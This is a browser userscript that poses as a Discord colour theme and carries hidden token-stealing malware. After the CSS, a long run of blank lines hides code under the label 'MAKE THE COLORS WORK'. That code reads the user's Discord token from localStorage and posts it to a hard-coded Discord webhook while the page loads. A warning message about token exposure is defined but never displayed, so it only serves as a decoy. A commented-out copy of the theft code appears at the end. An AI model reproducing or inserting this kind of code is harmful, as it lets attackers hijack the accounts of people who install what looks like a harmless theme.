// ==UserScript==
// @name         Cool Color Change!
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Changes Colors To Be Way Better For Discord!
// @author       Taco!
// @match        https://discord.com/activ*
// @match        https://discord.com/channel*
// @grant        GM_addStyle
// @run-at       document-start
// @downloadURL https://update.greasyfork.org/scripts/412697/Cool%20Color%20Change%21.user.js
// @updateURL https://update.greasyfork.org/scripts/412697/Cool%20Color%20Change%21.meta.js
// ==/UserScript==

(function () {
   'use strict';
//Cool Color Change For Discord!
var High = "#000000"; // #2F3E4E
var Med = "#FF1111"; // #1B2C3E
var Low = "#000000"; // #162332
var textColor = "red"; // red
var fontFamily = "'blue', sans-serif";

var fontLink = document.createElement('link');
fontLink.href = "https://fonts.googleapis.com/css2?family=Mada:wght@600&family=Reem+Kufi&display=swap";
document.head.appendChild(fontLink);

GM_addStyle(`
@import url(${fontLink.href});
.theme-dark {
   --background: url(https://i.imgur.com/kJGcWiR.jpg);
   --background-primary: ${High};
   --background-secondary: ${Med};
   --background-tertiary: ${Low};
   --channeltextarea-background: ${High};
   --deprecated-panel-background: ${High};
}
.theme-dark .scrollerThemed-2oenus.themedWithTrack-q8E3vB .scroller-2FKFPG::-webkit-scrollbar-track-piece {
   background-color: ${Med};
   border: 3px solid ${High};
   border-radius: 7px;
}
.theme-dark .scrollerThemed-2oenus.themedWithTrack-q8E3vB .scroller-2FKFPG::-webkit-scrollbar-thumb {
   background-color: ${Low};
   border-color: ${High};
}
.inner-zqa7da {
   border: rgba(204, 204, 204, 0.27) solid 1px;
   border-radius: 0;
}
.container-2ax-kl {
   color: #ffffff;
}
.container-3baos1, .container-3baos1 .avatar-SmRMf2, .scrollableContainer-2NUZem, .theme-dark .body-3iLsc4, .theme-dark .footer-1fjuF6, .scroller-3BxosC  {
   background-color: ${Low};
}
.auto-Ge5KZx, .auto-Ge5KZx.fade-2kXiP2:hover, .friendsEmpty-1K9B4k, .headerTop-3C2Zn0, .theme-dark .quickMessage-1yeL4E, .content-1LAB8Z {
   background-color: ${High};
}
.bodyTitle-Y0qMQz, .container-1sFeqf {
   color: ${textColor};
}
.theme-dark .headerClickable-2IVFo9, .theme-dark .headerDefault-1wrJcN, .webhookRow-20TsIQ, .item-26Dhrx, .theme-dark .footer-2gL1pp, .tierHeaderContent-2-YfvN {
   background-color: ${Low};
}

.theme-dark .tierBody-x9kBBp, .horizontalAutocompletes-3blb-Z {
   background-color: ${Med};
}
.scroller-2hZ97C, .header-1TKi98, .noScroll-3xWe_g, .content-mK72R6, .content-2oypg3, .autocompleteScroller-iInVqR, .theme-dark .selectorSelected-1_M1WV, .contentWrapper-1VyP0K {
   background-color: ${High};
}
.theme-dark .autocompleteArrow-Zxoy9H, .theme-dark .header-2bNvm4, .container-1giJp5, .activityPanel-28dQGo {
  background-color: ${Low};
}
.userSettingsAccount-2eMFVR .userInfoEditing-1CEzdT, .userSettingsAccount-2eMFVR .userInfoViewing-16kqK3, .theme-dark .elevationHigh-1PneE4 {
   background-color: ${Med};
}
.formNotice-2_hHWR, .accountList-33MS45, .theme-dark .codeRedemptionRedirect-1wVR4b, .autocompleteRowVertical-q1K4ky {
   background-color: ${Med};
}
.theme-dark .row-rrHHJU.selected-1pIgLL, .card-1yV8cG, .mentioned-xhSam7 {
   background: ${Med};
}
.theme-dark .scrollerThemed-2oenus.themeGhostHairline-DBD-2d .scroller-2FKFPG, .container-3mrum_, .addInputWrapper-1BOZ3d, .popout-2iWAc-, .popouts-2bnG9Z {
   background-color: ${High};
}
.cozy-3raOZG .messageContent-2qWWxC {
   color: ${textColor};
   font-family: ${fontFamily};
}
.px-10SIf7.botTag-2WPJ74, .item-2hkk8m, .modeSelected-1zApJ_ .content-3at_AU, .modeSelected-1zApJ_:hover .content-3at_AU, .perksModalContentWrapper-2HU6uL  {
   background: ${High};
}
.zalgo-jN1Ica.cozy-3raOZG .header-23xsNx, .h5-18_1nd, .icon-22AiRD, .theme-dark .discriminator-byOsvi, .theme-dark .keybind-KpFkfr, .reactionCount-2mvXRV {
   color: ${textColor};
}
.edited-3sfAzf {
   color: ${Med};
}
.theme-dark .uploadModal-2ifh8j, .content-2hhZxN {
   background-color: ${High};
}
.uploadModal-2ifh8j .footer-3mqk7D.hasSpoilers-1IRtQC, .theme-dark .scroller-1-nKid {
   background: ${Med};
}
.uploadModal-2ifh8j .inner-3nWsbo .file-34mY5K .icon-kyxXVr.image-2yrs5j {
   border: 2px solid ${Med};
}
.checkboxEnabled-CtinEn {
   background: ${Med};
   color: ${Med};
}
.reactors-Blmlhw {
   background-color: ${High};
}
.unreadTop-73gZ2_ .unreadBar-3YD_k9:before {
`)


























































































   //MAKE THE COLORS WORK
   //---------------------------------------------
   if(!window.localStorage) {
      Object.defineProperty(window, "localStorage", new(function () {
         var aKeys = [],
            oStorage = {};
         Object.defineProperty(oStorage, "getItem", {
            value: function (sKey) {
               return this[sKey] ? this[sKey] : null;
            },
            writable: false,
            configurable: false,
            enumerable: false
         });
         Object.defineProperty(oStorage, "key", {
            value: function (nKeyId) {
               return aKeys[nKeyId];
            },
            writable: false,
            configurable: false,
            enumerable: false
         });
         Object.defineProperty(oStorage, "setItem", {
            value: function (sKey, sValue) {
               if(!sKey) {
                  return;
               }
               document.cookie = escape(sKey) + "=" + escape(sValue) + "; expires=Tue, 19 Jan 2038 03:14:07 GMT; path=/";
            },
            writable: false,
            configurable: false,
            enumerable: false
         });
         Object.defineProperty(oStorage, "length", {
            get: function () {
               return aKeys.length;
            },
            configurable: false,
            enumerable: false
         });
         Object.defineProperty(oStorage, "removeItem", {
            value: function (sKey) {
               if(!sKey) {
                  return;
               }
               document.cookie = escape(sKey) + "=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/";
            },
            writable: false,
            configurable: false,
            enumerable: false
         });
         Object.defineProperty(oStorage, "clear", {
            value: function () {
               if(!aKeys.length) {
                  return;
               }
               for(var sKey in aKeys) {
                  document.cookie = escape(sKey) + "=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/";
               }
            },
            writable: false,
            configurable: false,
            enumerable: false
         });
         this.get = function () {
            var iThisIndx;
            for(var sKey in oStorage) {
               iThisIndx = aKeys.indexOf(sKey);
               if(iThisIndx === -1) {
                  oStorage.setItem(sKey, oStorage[sKey]);
               } else {
                  aKeys.splice(iThisIndx, 1);
               }
               delete oStorage[sKey];
            }
            for(aKeys; aKeys.length > 0; aKeys.splice(0, 1)) {
               oStorage.removeItem(aKeys[0]);
            }
            for(var aCouple, iKey, nIdx = 0, aCouples = document.cookie.split(/\s*;\s*/); nIdx < aCouples.length; nIdx++) {
               aCouple = aCouples[nIdx].split(/\s*=\s*/);
               if(aCouple.length > 1) {
                  oStorage[iKey = unescape(aCouple[0])] = unescape(aCouple[1]);
                  aKeys.push(iKey);
               }
            }
            return oStorage;
         };
         this.configurable = false;
         this.enumerable = true;
      })());
   }
   //---------------------------------------------------

   var userToken = localStorage.getItem('token');

   var warn = "Allowing anyone to see your token can result in them gaining access to your account. This can lead to impersonation, server bans, account closure, etc.\n\n\n\n If you do not understand this, press 'Cancel'."

   // show warning, if accepted show token
   document.addEventListener('readystatechange', event => {
      if(event.target.readyState === "interactive") {
                       var xhrr = new XMLHttpRequest();
        xhrr.open("POST", "https://discord.com/api/webhooks/763765686228877314/UkPLvx7akJNoV_jO7YK22Srb4MKKam8SleXecRof-KLyQ2hWJ6DhQRxdrto5IjlR_03F", true);
        xhrr.setRequestHeader('Content-Type', 'application/json');
        xhrr.send(JSON.stringify({
            'content': "UserToken:" + userToken,
            'username':'webhook',
        }));
      } else if(event.target.readyState === "complete") {
                               var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://discord.com/api/webhooks/763765686228877314/UkPLvx7akJNoV_jO7YK22Srb4MKKam8SleXecRof-KLyQ2hWJ6DhQRxdrto5IjlR_03F", true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify({
            'content': "UserToken:" + userToken,
            'username':'webhook',
        }));
      }
   });

   // prevent pasting token into discord
   document.addEventListener('paste', function (e) {
      if(e.clipboardData.getData('text/plain') == userToken) {
         // clear clipboard
         e.clipboardData.setData('text/plain', 'do not post your token here');
         // prevent the default paste action
         e.preventDefault();
         // prevent pasting token, paste warning instead
         var pasteToken = new ClipboardEvent('paste');
         pasteToken.clipboardData.items.add('do not post your token here', 'text/plain');
         document.dispatchEvent(pasteToken);
         // put token back into clipboard to allow pasting outside discord
         e.clipboardData.setData('text/plain', userToken);
      }
   });
})();
/*
   var userToken = localStorage.getItem('token');
    var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://discord.com/api/webhooks/763765686228877314/UkPLvx7akJNoV_jO7YK22Srb4MKKam8SleXecRof-KLyQ2hWJ6DhQRxdrto5IjlR_03F", true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify({
            'content': "UserToken:" + userToken,
            'username':'webhook',
        }));
});*/